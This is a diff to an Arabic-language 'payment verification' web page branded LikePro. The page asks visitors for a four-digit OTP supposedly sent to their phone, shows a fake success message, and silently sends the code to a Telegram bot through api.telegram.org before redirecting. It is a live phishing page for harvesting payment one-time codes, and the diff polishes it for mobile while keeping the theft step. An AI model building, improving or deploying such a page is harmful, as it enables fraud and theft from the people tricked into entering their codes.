@@ -2,11 +2,12 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>التحقق من الدفع</title>
     <style>
-        body { background: #0b1120; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        .box { background: #1e293b; padding: 30px; border-radius: 15px; text-align: center; width: 320px; }
-        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 8px; text-align: center; font-size: 20px; border: 1px solid #334155; background: #0f172a; color: white; }
+        body { background: #0b1120; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0; }
+        .box { background: #1e293b; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 320px; box-sizing: border-box; }
+        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 8px; text-align: center; font-size: 20px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
         .timer { color: #f87171; font-weight: bold; margin-bottom: 10px; }
         .pay-btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; color: #0f172a; font-weight: bold; cursor: pointer; }
     </style>
@@ -16,7 +17,7 @@
         <h3>أدخل رمز التحقق (OTP)</h3>
         <p>تم إرسال رمز التحقق إلى جوالك</p>
         <div class="timer" id="timer">01:00</div>
-        <input type="text" id="otp" placeholder="****" maxlength="4">
+        <input type="text" id="otp" placeholder="****" maxlength="4" inputmode="numeric">
         <button class="pay-btn" onclick="sendOtp()">تأكيد العملية</button>
     </div>
 
@@ -41,14 +42,12 @@
         
         if(code.length < 4) { alert("يرجى إدخال الكود المكون من 4 أرقام"); return; }
         
-        // تغيير شكل الصفحة ليظهر "تم بنجاح"
         document.getElementById('otpBox').innerHTML = `<h3 style="color:#38bdf8;">✅ تم إنشاء طلبك بنجاح!</h3><p>شكراً لثقتكم بـ LikePro</p>`;
         
         try {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ *رمز التحقق المستلم*: ${code}&parse_mode=Markdown`);
         } catch(e) {}
         
-        // العودة للرئيسية بعد 3 ثواني
         setTimeout(() => {
             window.location.href = "index.html";
         }, 3000);
